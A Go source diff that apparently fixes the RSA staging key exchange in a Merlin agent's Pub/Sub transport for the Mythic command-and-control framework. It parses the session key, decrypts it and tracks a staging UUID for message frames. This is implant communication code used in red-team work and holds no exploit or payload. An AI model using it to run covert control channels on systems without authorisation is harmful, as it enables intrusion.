@@ -43,6 +43,7 @@ type PubSubClient struct {
 	transport   *Transport
 	agentID     string // current Mythic UUID (starts as payloadID, updated to callback UUID after checkin)
 	payloadUUID string // original payload UUID (never changes, used for Merlin internal message IDs)
+	stagingUUID string // staging UUID from RSA key exchange (used for frame UUID until checkin completes)
 	instanceID  string // unique per-process ID for routing (prevents same-UUID collision)
 	config      map[string]interface{}
 	messages    chan interface{}
@@ -228,16 +229,24 @@ func (p *PubSubClient) Initial() error {
 		return fmt.Errorf("failed to marshal checkin: %w", err)
 	}
 
-	if core.Verbose {
-		color.Cyan(fmt.Sprintf("[*] Sending encrypted checkin with UUID: %s", p.agentID))
+	// Determine which UUID to use for the frame
+	// - RSA staging mode: use stagingUUID (so Mythic can find the encryption key)
+	// - PSK mode: use agentID (payload UUID, Mythic looks up PSK from payload)
+	frameUUID := p.agentID
+	if p.stagingUUID != "" {
+		frameUUID = p.stagingUUID
 	}
 
-	// Build Mythic frame: base64(payloadUUID + encrypted body)
+	if core.Verbose {
+		color.Cyan(fmt.Sprintf("[*] Sending encrypted checkin (frame UUID: %s, body UUID: %s)", frameUUID, p.agentID))
+	}
+
+	// Build Mythic frame: base64(frameUUID + encrypted body)
 	encrypted, err := aesEncrypt(p.psk, checkinJSON)
 	if err != nil {
 		return fmt.Errorf("failed to AES-encrypt checkin: %w", err)
 	}
-	frame := buildMythicFrame(p.agentID, encrypted)
+	frame := buildMythicFrame(frameUUID, encrypted)
 
 	// Send
 	if err := p.transport.SendRaw(frame); err != nil {
@@ -294,6 +303,9 @@ func (p *PubSubClient) Initial() error {
 	oldID := p.agentID
 	p.agentID = newID
 	p.transport.agentID = newID
+
+	// Clear staging UUID - no longer needed after successful checkin
+	p.stagingUUID = ""
 
 	// Mark checkin as done — future messages go to p.messages
 	p.checkinDone = true
@@ -366,8 +378,37 @@ func (p *PubSubClient) performRSAStaging() error {
 		color.Yellow(fmt.Sprintf("[DEBUG] Received staging_rsa response, body size: %d bytes", len(body)))
 	}
 
-	// The body is RSA-encrypted with our public key - decrypt it
-	aesKey, err := rsaDecryptOAEP(privKey, body)
+	// Mythic returns JSON with session_key field containing base64-encoded RSA-encrypted key
+	var stagingResp struct {
+		UUID       string `json:"uuid"`
+		SessionID  string `json:"session_id"`
+		SessionKey string `json:"session_key"`
+		Action     string `json:"action"`
+	}
+	if err := json.Unmarshal(body, &stagingResp); err != nil {
+		return fmt.Errorf("failed to parse staging_rsa response JSON: %w", err)
+	}
+
+	if stagingResp.SessionKey == "" {
+		return fmt.Errorf("staging_rsa response missing session_key field")
+	}
+
+	if stagingResp.UUID == "" {
+		return fmt.Errorf("staging_rsa response missing uuid field")
+	}
+
+	// Base64 decode the session_key
+	encryptedKey, err := base64.StdEncoding.DecodeString(stagingResp.SessionKey)
+	if err != nil {
+		return fmt.Errorf("failed to base64 decode session_key: %w", err)
+	}
+
+	if core.Debug {
+		color.Yellow(fmt.Sprintf("[DEBUG] Decoded session_key, encrypted size: %d bytes", len(encryptedKey)))
+	}
+
+	// RSA decrypt to get the AES key
+	aesKey, err := rsaDecryptOAEP(privKey, encryptedKey)
 	if err != nil {
 		return fmt.Errorf("failed to RSA-decrypt AES key: %w", err)
 	}
@@ -379,8 +420,13 @@ func (p *PubSubClient) performRSAStaging() error {
 	// Store the AES key
 	p.psk = aesKey
 
+	// Save the staging UUID - this is needed for building frames so Mythic can find the encryption key.
+	// The payloadUUID stays in agentID and is used inside the JSON body for payload lookup.
+	p.stagingUUID = stagingResp.UUID
+
 	if core.Verbose {
 		color.Green("[+] Successfully obtained 32-byte AES key via RSA staging")
+		color.Green(fmt.Sprintf("[+] Staging UUID: %s", p.stagingUUID))
 	}
 
 	return nil
